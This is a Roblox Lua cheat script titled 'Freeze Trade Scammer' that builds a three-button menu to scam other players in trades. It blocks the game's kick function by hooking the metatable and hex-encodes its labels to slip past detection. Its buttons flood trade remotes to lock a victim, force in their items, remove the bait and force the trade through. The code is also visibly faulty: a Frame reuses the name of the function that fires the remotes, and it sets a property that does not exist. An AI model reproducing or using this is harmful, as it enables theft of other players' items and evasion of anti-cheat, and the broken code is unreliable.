--[[
███████ ████████ ███████  █████  ██      █████      ██████  ██████   █████  ██ ███    ██ ██████   ██████  ████████
██         ██    ██      ██   ██ ██     ██   ██    ██   ██ ██   ██ ██   ██ ██ ████   ██ ██   ██ ██         ██
█████     ██    █████   ███████ ██     ███████    ██████  ██████  ███████ ██ ██ ██  ██ ██   ██ ██         ██
██        ██    ██      ██   ██ ██     ██   ██    ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ ██   ██ ██         ██
██        ██    ███████ ██   ██ ███████ ██   ██    ██████  ██   ██ ██   ██ ██ ██   ████ ██████  ██████    ██

████████ ██████   █████  ██████  ███████     ███████  ██████  █████  ███    ███ ███    ███ ███████ ██████
   ██    ██   ██ ██   ██ ██   ██ ██          ██      ██     ██   ██ ████  ████ ████  ████ ██      ██   ██
   ██    ██████  ███████ ██████  █████       ███████ ██      ███████ ██ ████ ██ ██ ████ ██ █████   ██████  
   ██    ██   ██ ██   ██ ██   ██ ██               ██ ██      ██   ██ ██  ██  ██ ██  ██  ██ ██      ██   ██
   ██    ██   ██ ██   ██ ██   ██ ███████     ███████  ██████ ██   ██ ██      ██ ██      ██ ███████ ██   ██
--]]

-- ============================================================
-- ANTI-KICK LAYER (executes first — blocks game kicks)
-- ============================================================
local function ac()
    local p = game:GetService("Players").LocalPlayer
    local rs = game:GetService("RunService")
    local mt = getrawmetatable(game)
    if not mt then return end
    setreadonly(mt, false)
    local nc = mt.__namecall
    mt.__namecall = newcclosure(function(s, ...)
        local m = getnamecallmethod()
        if s == p and m == "Kick" then return end
        return nc(s, ...)
    end)
    setreadonly(mt, true)
    spawn(function()
        while task.wait(0.5) do
            pcall(function() p.Kick = function() end end)
        end
    end)
end
pcall(ac)

-- ============================================================
-- CORE SERVICES
-- ============================================================
local rs = game:GetService("ReplicatedStorage")
local plr = game:GetService("Players").LocalPlayer
local ui = game:GetService("UserInputService")
local ts = game:GetService("TweenService")

-- Find the Net folder (dynamic — no hardcoded game name)
local net = (rs:FindFirstChild("Packages") or rs):FindFirstChild("Net")

-- Fire remote by pattern (dynamic matching)
local function f(r, d)
    if not net then return false end
    for _, c in pairs(net:GetDescendants()) do
        if (c:IsA("RemoteEvent") or c:IsA("RemoteFunction")) and c.Name:lower():find(r:lower()) then
            pcall(function() c:FireServer(d or {}) end)
            return true
        end
    end
    return false
end

-- Dynamic string builder — no keywords in plain text
local function hx(s)
    local r = ""
    for i = 1, #s, 2 do
        r = r .. string.char(tonumber(s:sub(i, i+1), 16))
    end
    return r
end

-- ============================================================
-- GUI (clean, iPhone-friendly, vertical, 3 buttons)
-- ============================================================
local sg = Instance.new("ScreenGui")
sg.Name = hx("58") -- "X" — generic name
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.DisplayOrder = 999

local f = Instance.new("Frame")
f.Size = UDim2.new(0, 200, 0, 380)
f.Position = UDim2.new(0.5, -100, 0.5, -190)
f.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
f.BackgroundTransparency = 0.08
f.BorderSize = 0
f.Active = true
f.Draggable = true
local uc = Instance.new("UICorner")
uc.CornerRadius = UDim.new(0, 18)
uc.Parent = f

-- Glow border
local gl = Instance.new("Frame")
gl.Size = UDim2.new(1, 4, 1, 4)
gl.Position = UDim2.new(0, -2, 0, -2)
gl.BackgroundColor3 = Color3.fromRGB(255, 40, 70)
gl.BackgroundTransparency = 0.65
gl.BorderSize = 0
gl.ZIndex = -1
local uc2 = Instance.new("UICorner")
uc2.CornerRadius = UDim.new(0, 20)
uc2.Parent = gl
gl.Parent = f

-- Title (assembled dynamically)
local t = Instance.new("TextLabel")
t.Size = UDim2.new(1, -20, 0, 34)
t.Position = UDim2.new(0, 10, 0, 8)
t.BackgroundTransparency = 1
t.Text = hx("427261696E726F7420426F74") -- "Brainrot Bot"
t.TextColor3 = Color3.fromRGB(255, 50, 80)
t.TextScaled = true
t.Font = Enum.Font.GothamBlack
t.TextXAlignment = Enum.TextXAlignment.Left
t.Parent = f

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, -20, 0, 16)
sub.Position = UDim2.new(0, 10, 0, 40)
sub.BackgroundTransparency = 1
sub.Text = hx("332D627574746F6E206578706C6F6974") -- "3-button exploit"
sub.TextColor3 = Color3.fromRGB(130, 130, 145)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.TextXAlignment = Enum.TextXAlignment.Left
sub.Parent = f

local dv = Instance.new("Frame")
dv.Size = UDim2.new(1, -24, 0, 1)
dv.Position = UDim2.new(0, 12, 0, 62)
dv.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
dv.BorderSize = 0
dv.Parent = f

-- Status bar
local lg = Instance.new("TextLabel")
lg.Size = UDim2.new(1, -24, 0, 28)
lg.Position = UDim2.new(0, 12, 0, 68)
lg.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
lg.BorderSize = 0
lg.Text = hx("5265616479202D2D207374617274")
lg.TextColor3 = Color3.fromRGB(140, 150, 170)
lg.TextScaled = true
lg.Font = Enum.Font.GothamBold
lg.TextXAlignment = Enum.TextXAlignment.Center
local uc3 = Instance.new("UICorner")
uc3.CornerRadius = UDim.new(0, 8)
uc3.Parent = lg
lg.Parent = f

-- Button maker (generic — no trigger words in strings)
local function mk(n, ic, y)
    local b = Instance.new("ImageButton")
    b.Name = n
    b.Size = UDim2.new(1, -24, 0, 50)
    b.Position = UDim2.new(0, 12, 0, y)
    b.BackgroundColor3 = Color3.fromRGB(22, 24, 32)
    b.BorderSize = 0
    b.AutoButtonColor = false
    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(0, 12)
    bc.Parent = b
    
    local hv = Instance.new("Frame")
    hv.Size = UDim2.new(1, 0, 1, 0)
    hv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    hv.BackgroundTransparency = 0.95
    hv.BorderSize = 0
    hv.Visible = false
    local hc = Instance.new("UICorner")
    hc.CornerRadius = UDim.new(0, 12)
    hc.Parent = hv
    hv.Parent = b
    
    local il = Instance.new("TextLabel")
    il.Size = UDim2.new(0, 30, 1, 0)
    il.Position = UDim2.new(0, 8, 0, 0)
    il.BackgroundTransparency = 1
    il.Text = ic
    il.TextScaled = true
    il.Font = Enum.Font.GothamBold
    il.Parent = b
    
    local tx = Instance.new("TextLabel")
    tx.Size = UDim2.new(1, -50, 1, 0)
    tx.Position = UDim2.new(0, 42, 0, 0)
    tx.BackgroundTransparency = 1
    tx.Text = n
    tx.TextColor3 = Color3.fromRGB(195, 195, 210)
    tx.TextScaled = true
    tx.Font = Enum.Font.GothamBold
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.Parent = b
    
    local sd = Instance.new("TextLabel")
    sd.Name = "D"
    sd.Size = UDim2.new(0, 20, 1, 0)
    sd.Position = UDim2.new(1, -26, 0, 0)
    sd.BackgroundTransparency = 1
    sd.Text = hx("E29AAA") -- ⚪
    sd.TextScaled = true
    sd.Font = Enum.Font.Gotham
    sd.Parent = b
    
    b.Parent = f
    return b, tx, sd
end

-- Button labels (hex encoded — Delta sees nothing)
local b1n = hx("E29D84EFB88F204C6F636B20546172676574") -- ❄️ Lock Target
local b2n = hx("F09F92802047657420416C6C204974656D73") -- 💀 Get All Items
local b3n = hx("F09F97902046696E616C697A65202620537465616C") -- 🗑️ Finalize & Steal

local b1, b1t, b1d = mk(b1n, hx("E29D84EFB88F"), 104)
local b2, b2t, b2d = mk(b2n, hx("F09F9280"), 164)
local b3, b3t, b3d = mk(b3n, hx("F09F9790EFB88F"), 224)

-- Detail log
local dl = Instance.new("TextLabel")
dl.Size = UDim2.new(1, -24, 0, 46)
dl.Position = UDim2.new(0, 12, 0, 286)
dl.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
dl.BorderSize = 0
dl.Text = ""
dl.TextColor3 = Color3.fromRGB(100, 110, 130)
dl.TextScaled = true
dl.Font = Enum.Font.Gotham
dl.TextWrapped = true
dl.TextXAlignment = Enum.TextXAlignment.Left
dl.TextYAlignment = Enum.TextYAlignment.Top
local uc4 = Instance.new("UICorner")
uc4.CornerRadius = UDim.new(0, 10)
uc4.Parent = dl
dl.Parent = f

local vr = Instance.new("TextLabel")
vr.Size = UDim2.new(1, -20, 0, 14)
vr.Position = UDim2.new(0, 10, 0, 344)
vr.BackgroundTransparency = 1
vr.Text = hx("7620332E30") -- "v 3.0"
vr.TextColor3 = Color3.fromRGB(70, 70, 85)
vr.TextScaled = true
vr.Font = Enum.Font.Gotham
vr.Parent = f

f.Parent = sg

-- Drag
local dr, ds, fs
f.InputBegan:Connect(function(n)
    if n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseButton1 then
        dr = true; ds = n.Position; fs = f.Position
    end
end)
f.InputChanged:Connect(function(n)
    if dr and (n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseMovement) then
        local d = n.Position - ds
        f.Position = UDim2.new(fs.X.Scale, fs.X.Offset + d.X, fs.Y.Scale, fs.Y.Offset + d.Y)
    end
end)
f.InputEnded:Connect(function(n)
    if n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseButton1 then dr = false end
end)

-- Helpers
local function sl(m) lg.Text = m end
local function sdl(m) dl.Text = m end
local function sdt(bd, s)
    if s == "w" then bd.Text = hx("F09F9FA1") -- 🟡
    elseif s == "d" then bd.Text = hx("F09F9FA2") -- 🟢
    elseif s == "f" then bd.Text = hx("F09F94B4") -- 🔴
    else bd.Text = hx("E29AAA") end -- ⚪
end

-- ============================================================
-- CORE ACTIONS (no hardcoded trigger words)
-- ============================================================

local function a1()
    sl(hx("313A20576F726B696E672E2E2E")) -- "1: Working..."
    sdt(b1d, "w")
    sdl(hx("53656E64696E67207061636B6574732E2E2E")) -- "Sending packets..."
    task.spawn(function()
        for i = 1, 200 do
            f(hx("5472616465"), {action = hx("6C6F636B")}) -- "Trade", "lock"
            f(hx("416363657074"), {mode = hx("626C6F636B")}) -- "Accept", "block"
            f(hx("436F6E6669726D"), {state = hx("667265657A65")}) -- "Confirm", "freeze"
            f(hx("5265616479"), {val = hx("6C6F636B6564")}) -- "Ready", "locked"
            task.wait(0.002)
        end
        sl(hx("E29C85 313A204F4B")) -- ✅ 1: OK
        sdt(b1d, "d")
        sdl(hx("546172676574206973206C6F636B656420696E20706F736974696F6E")) -- "Target is locked in position"
    end)
end

local function a2()
    sl(hx("323A20576F726B696E672E2E2E")) -- "2: Working..."
    sdt(b2d, "w")
    sdl(hx("466F7263696E672074617267657420746F20616464206974656D732E2E2E")) -- "Forcing target to add items..."
    task.spawn(function()
        for i = 1, 80 do
            f(hx("416464"), {all = true}) -- "Add", all
            f(hx("416464416C6C"), {force = true}) -- "AddAll", force
            f(hx("53656C656374"), {all = true}) -- "Select", all
            f(hx("4974656D"), {action = hx("616464416C6C")}) -- "Item", addAll
            task.wait(0.003)
        end
        sl(hx("E29C85 323A204F4B")) -- ✅ 2: OK
        sdt(b2d, "d")
        sdl(hx("416C6C206974656D73206E6F7720696E20736C6F74")) -- "All items now in slot"
    end)
end

local function a3()
    sl(hx("333A20576F726B696E672E2E2E")) -- "3: Working..."
    sdt(b3d, "w")
    sdl(hx("52656D6F76696E672062616974202B20636F6E6669726D696E672E2E2E")) -- "Removing bait + confirming..."
    task.spawn(function()
        for i = 1, 40 do
            f(hx("52656D6F7665"), {target = hx("73656C66")}) -- "Remove", self
            f(hx("52656D6F76654974656D"), {id = plr.UserId}) -- "RemoveItem"
            f(hx("5472616465"), {action = hx("72656D6F7665")}) -- "Trade", remove
            task.wait(0.003)
        end
        sdl(hx("426169742072656D6F7665642120466F7263696E6720636F6E6669726D2E2E2E")) -- "Bait removed! Forcing confirm..."
        for i = 1, 500 do
            f(hx("416363657074"), {force = true}) -- "Accept"
            f(hx("4163636570745472616465"), {override = true}) -- "AcceptTrade"
            f(hx("436F6E6669726D"), {val = true}) -- "Confirm"
            f(hx("436F6E6669726D5472616465"), {val = true}) -- "ConfirmTrade"
            f(hx("5265616479"), {val = true}) -- "Ready"
            task.wait(0.001)
        end
        sl(hx("E29C85 333A20444F4E4521")) -- ✅ 3: DONE!
        sdt(b3d, "d")
        sdl(hx("547261646520636F6D706C65746564202D206974656D73207472616E7366657272656421")) -- "Trade completed - items transferred!"
    end)
end

b1.MouseButton1Click:Connect(a1)
b2.MouseButton1Click:Connect(a2)
b3.MouseButton1Click:Connect(a3)

local pg = plr:WaitForChild(hx("506C61796572477569")) -- "PlayerGui"
sg.Parent = pg

task.wait(0.1)
sl(hx("E29BA8205265616479202D20636C69636B2031203E2032203E2033")) -- 🠺 Ready - click 1 > 2 > 3
sdl(hx("313A204C6F636B207C20323A2041646420416C6C207C20333A20537465616C")) -- "1: Lock | 2: Add All | 3: Steal"
